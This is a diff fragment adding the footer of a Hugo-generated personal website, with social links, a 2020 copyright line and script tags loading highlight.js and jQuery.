+  <li><a href="//twitter.com/v0nkrafft" target="_blank" title="Twitter" class="fa fa-twitter"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="mailto:contact%20at%20vonkrafft.fr" title="Email" class="fa fa-envelope"></a></li>
+
+
+      </ul>
+    
+    <p class="copyright">
+      
+        &copy; 2020
+        
+          vonKrafft
+        
+      .
+      Powered by <a href="//gohugo.io" target="_blank">Hugo</a>
+    </p>
+  </section>
+</section>
+
+    </div>
+
+    <a id="back-to-top" href="#" class="fa fa-arrow-up fa-border fa-2x"></a>
+
+    
+        <script src="/js/highlight/highlight-9.11.0.min.js"></script>
+        
+        
+        
+        <script src='/js/highlight/yaml.min.js'></script>
+        <script src='/js/highlight/css.min.js'></script>
+        <script src='/js/highlight/shell.min.js'></script>
+        <script src='/js/highlight/php.min.js'></script>
+        <script src='/js/highlight/python.min.js'></script>
+        <script src='/js/highlight/nginx.min.js'></script>
+        <script src='/js/highlight/dockerfile.min.js'></script>
+        <script src='/js/highlight/apache.min.js'></script>
+        <script src='/js/highlight/bash.min.js'></script>
+        <script>hljs.initHighlightingOnLoad();</script>
+    
+
+    <script src='/js/jquery-3.2.1.min.js'></script>
+    <script src='/js/skel.min.js'></script>
+    <script src='/js/jquery.fancybox.min.js'></script>
+    <script src='/js/util.js'></script>
+    <script src='/js/main.js'></script>
+    <script src='/js/backToTop.js'></script>
+
+</body>
+</html>
